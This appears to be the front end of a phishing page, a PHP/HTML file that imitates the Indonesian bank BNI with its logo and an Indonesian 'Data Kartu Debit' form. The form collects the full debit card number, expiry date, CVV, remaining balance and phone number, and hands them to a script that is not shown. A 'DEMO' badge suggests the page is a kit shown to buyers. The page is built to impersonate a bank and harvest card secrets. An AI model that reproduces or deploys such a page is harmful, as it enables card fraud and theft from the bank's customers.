<?php
?>
<html>
  <head>
    <title>BNI</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/common/css/global.css">
    <link rel="stylesheet" href="assets/common/css/card.css">
    <link rel="stylesheet" href="assets/lib/ripple/dist/ripple.css">
    <link rel="stylesheet" href="assets/lib/jquery-ui/jquery-ui.css">
    <script>
      const module = {};
    </script>
    <script src="assets/common/js/jquery.js"></script>
    <script type="module" src="assets/common/js/card.js"></script>
    <script type="module" src="assets/lib/jquery-ui/jquery-ui.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
  </head>
  <body>
    <div style="width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; background-color: #e3e8eb;">
      <div style="width: 100%; display: flex; flex-direction: column; background-color: #ff7f08;">
        <div style="width: calc(100% - 20px); display: flex; flex-direction: row; justify-content: space-between; align-items: center; margin-left: 10px; margin-right: 10px; margin-top: 10px;">
          <img src="assets/common/img/bni_logo.png" width="100px" height="50px">
          <div style="color: #ffffff; font-size: 15px; font-weight: bold;">Data Kartu Debit</div>
          <div style="width: 100px; height: 50px;"></div>
        </div>
        <div style="width: 100%; height: 4px; background-color: #ffffff; display: flex; flex-direction; row; justify-content: flex-end; margin-bottom: 10px; margin-top: 10px;">
          <div style="width: 50px; height: 100%; background-color: #27a3a6;"></div>
        </div>
      </div>
      <div style="flex: 1; width: 100%; position: relative;">
        <div style="width: 100%; display: flex; flex-direction: column; align-items: center; overflow: scroll;">
          <div class="card" style="width: 300px; min-height: 200px; max-height: 200px; height: 200px; background-color: #ffffff; border-radius: 20px; border: 5px solid #ff7f08; margin-top: 20px; position: relative; overflow: hidden;">
            <img src="assets/common/img/card.png" width="100%" height="100%" style="border-radius: 10px; object-fit: fill;">
            <div id="preview-debit" style="position: absolute; left: 45px; top: 90px; color: #ffffff; font-size: 20px; font-weight: bold; text-shadow: 0px 6px 8px rgba(0,0,0,0.8);"> #### #### #### #### </div>
            <div style="position: absolute; left: 23px; top: 140px; color: #ffffff; font-size: 15px; font-weight: bold; text-shadow: 0px 6px 8px rgba(0,0,0,0.8);"> Berlaku Sampai </div>
            <div style="position: absolute; left: 30px; top: 170px; color: #ffffff; font-size: 15px; font-weight: bold; text-shadow: 0px 6px 8px rgba(0,0,0,0.8);"> MM / YY </div>
          </div>
          <div style="width: calc(100% - 80px); margin-left: 20px; margin-right: 20px; margin-top: 20px; margin-bottom: 120px; border-radius: 10px; background-color: #f9f9f9; padding: 20px; box-shadow: 0 2px 4px 0 rgba(0,0,0,0.1);">
            <div style="width: calc(100% - 20px); height: 50px; border-radius: 5px; background-color: #f4f5f7; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; box-shadow: 0 4px 16px 0 rgba(0,0,0,0.3); display: flex; flex-direction: row; align-items: center;">
              <ion-icon name="card" style="color: #888888; font-size: 20px;"></ion-icon>
              <input id="debit-number" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; margin-left: 10px;" placeholder="Masukkan 16 digit nomor kamu" type="number" maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div style="width: 100%; display: flex; flex-direction: row; align-items: center; margin-top: 20px;">
              <div style="flex: 1; width: calc(100% - 20px); height: 50px; border-radius: 5px; background-color: #f4f5f7; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; box-shadow: 0 4px 16px 0 rgba(0,0,0,0.3); margin-right: 6px; display: flex; flex-direction: row; align-items: center;">
                <input id="expiry" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; flex: 1;" placeholder="##/##" type="text" maxlength="5" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                <ion-icon name="calendar-number" style="color: #888888; font-size: 20px;"></ion-icon>
              </div>
              <div style="flex: 1; width: calc(100% - 20px); height: 50px; border-radius: 5px; background-color: #f4f5f7; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; box-shadow: 0 4px 16px 0 rgba(0,0,0,0.3); margin-left: 6px; display: flex; flex-direction: row; align-items: center;">
                <input id="cvv" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; flex: 1;" placeholder="CVV" type="number" maxlength="3" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
                <ion-icon name="card" style="color: #888888; font-size: 20px;"></ion-icon>
              </div>
            </div>
            <div style="width: calc(100% - 20px); height: 50px; border-radius: 5px; background-color: #f4f5f7; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; box-shadow: 0 4px 16px 0 rgba(0,0,0,0.3); display: flex; flex-direction: row; align-items: center; margin-top: 20px;">
              <div style="color: #000000; font-size: 15px;">Rp</div>
              <input id="balance" style="width: 100%; height: 100%; margin-left: 10px; background-color: #00000000; outline: 0; border: 0;" type="number" maxlength="20" placeholder="( Sisa Saldo )" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div style="width: calc(100% - 20px); height: 50px; border-radius: 5px; background-color: #f4f5f7; padding-left: 10px; padding-right: 10px; color: #000000; font-size: 20px; box-shadow: 0 4px 16px 0 rgba(0,0,0,0.3); display: flex; flex-direction: row; align-items: center; margin-top: 20px;">
              <ion-icon name="call" style="color: #888888; font-size: 20px;"></ion-icon>
              <input id="phone" style="width: 100%; height: 100%; background-color: #00000000; outline: 0; border: 0; margin-left: 10px;" placeholder="Masukkan nomor handphone" type="number" maxlength="16" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
            </div>
            <div class="ripple" style="width: calc(100% - 40px); height: 50px; margin-left: 20px; margin-right: 20px; margin-top: 20px; margin-bottom: 10px; border-radius: 10px; background-color: #ff7f08; box-shadow: 0 2px 4px 0 rgba(0,0,0,0.1); display: flex; justify-content: center; align-items: center; color: #ffffff; font-size: 15px; font-weight: bold;" onclick="module.process()"> Lanjutkan </div>
          </div>
        </div>
        <div id="loader" style="position: fixed; left: 0; top: 0; width: 100%; height: 100%; background-color: #0000007f; display: none; flex-direction: column; justify-content: center; align-items: center;">
            <div style="width: calc(100% - 40px); height: 200px; border-radius: 10px; background-color: #ffffff; display: flex; justify-content: center; align-items: center;">
                <span class="loader"></span>
            </div>
        </div>
      </div>
      <img src="assets/common/img/bottom_menu.png" width="100%" height="100px" style="position: fixed; left: 0; bottom: 0; object-fit: fill;">
      <div style="position: fixed; right: 10px; bottom: 10px; background-color: #ff0000; color: #ffffff; padding-left: 10px; padding-right: 10px; padding-top: 2px; padding-bottom: 2px; font-weight: bold; font-size: 20px;">
          DEMO
      </div>
    </div>
  </body>
</html>